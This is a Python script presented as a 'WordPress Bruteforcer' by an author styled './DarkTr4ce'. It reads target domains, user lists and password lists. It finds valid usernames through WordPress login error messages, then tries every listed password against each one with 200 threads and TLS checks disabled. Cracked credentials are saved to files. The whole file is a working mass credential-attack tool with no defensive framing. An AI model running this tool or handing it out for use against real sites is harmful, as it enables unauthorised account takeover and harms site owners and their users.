import requests, os, sys, time, urllib3, threading
from colorama import Fore, Style, init
from queue import Queue

urllib3.disable_warnings()
init(autoreset=True)

thread_count = 200
queue = Queue()
lock = threading.Lock()

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    clear()
    print(Fore.RED + Style.BRIGHT + """
██████╗  █████╗ ██████╗ ██╗  ██╗████████╗████████╗██████╗  █████╗  ██████╗███████╗
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝███████║██████╔╝█████╔╝    ██║      ██║   ██████╔╝███████║██║     █████╗  
██╔═══╝ ██╔══██║██╔═══╝ ██╔═██╗    ██║      ██║   ██╔═══╝ ██╔══██║██║     ██╔══╝  
██║     ██║  ██║██║     ██║  ██╗   ██║      ██║   ██║     ██║  ██║╚██████╗███████╗
╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝

""" + Fore.CYAN + """
 ┌──────────────────────────────────────────────┐
 │  Author  : ./DarkTr4ce                       │
 │  Script  : WordPress Bruteforcer - DarkTr4ce │
 │  Contact : ./DarkTr4ce                       │
 └──────────────────────────────────────────────┘
""")
    print(Fore.YELLOW + "[*] Starting scan...\n")

def is_wp_login(url):
    try:
        res = requests.get(url, timeout=10, verify=False)
        return 'wp-login.php' in res.text or 'wordpress' in res.text.lower()
    except:
        return False

def attempt_login(url, username, password):
    try:
        data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In'
        }
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0'
        }
        res = requests.post(url, data=data, headers=headers, allow_redirects=False, verify=False, timeout=10)
        return res.status_code == 302, res.text
    except:
        return False, ''

def save_line(filename, content):
    with lock:
        with open(filename, 'a') as f:
            f.write(content + '\n')

def worker():
    while not queue.empty():
        target, user_list, pass_list = queue.get()
        if not target.startswith("http"):
            target = "http://" + target
        login_url = target.rstrip('/') + '/wp-login.php'

        if not is_wp_login(login_url):
            print(Fore.YELLOW + f"[!] Skipped {target}: Not WordPress login page or unreachable")
            queue.task_done()
            continue

        for user in user_list:
            status, text = attempt_login(login_url, user, "tes-password")
            if "The password you entered for the username" in text:
                print(Fore.GREEN + f"[+] Valid Username: {user} at {login_url}")
                save_line('valid_usernames.txt', f"{login_url}:{user}")

                for pw in pass_list:
                    ok, _ = attempt_login(login_url, user, pw)
                    sys.stdout.write(Fore.CYAN + f"\r[~] Trying {user}:{pw} at {login_url}...")
                    sys.stdout.flush()

                    if ok:
                        print(Fore.GREEN + f"\n[+] SUCCESS: {user}@{pw} at {login_url}")
                        save_line('valid_credentials.txt', f"{login_url}:{user}@{pw}")
                        save_line('valid_passwords.txt', f"{login_url}@{pw}")
                        break
            else:
                continue

        queue.task_done()

def main():
    banner()

    with open('domain.txt') as f:
        targets = [x.strip() for x in f if x.strip()]
    with open('user.txt') as f:
        users = [x.strip() for x in f if x.strip()]
    with open('passwords.txt') as f:
        passwords = [x.strip() for x in f if x.strip()]

    for t in targets:
        queue.put((t, users, passwords))

    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=worker)
        thread.daemon = True
        thread.start()
        threads.append(thread)

    queue.join()
    print(Fore.MAGENTA + "\n[+] Bruteforce selesai!")

if __name__ == '__main__':
    main()
